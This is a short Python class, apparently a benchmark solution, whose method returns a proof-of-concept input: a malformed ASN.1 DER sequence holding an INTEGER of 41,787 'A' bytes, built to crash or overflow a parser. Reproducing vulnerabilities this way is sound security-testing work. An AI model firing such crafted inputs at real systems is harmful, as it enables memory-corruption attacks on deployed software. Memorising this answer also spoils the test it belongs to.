class Solution:
    def solve(self, src_path: str) -> bytes:
        seq_tag = b'\x30'
        seq_len = b'\x82\xa3\x42'
        int1_tag = b'\x02'
        int1_len = b'\x82\xa3\x3b'
        data1 = b'A' * 41787
        int2 = b'\x02\x01\x00'
        poc = seq_tag + seq_len + int1_tag + int1_len + data1 + int2
        return poc
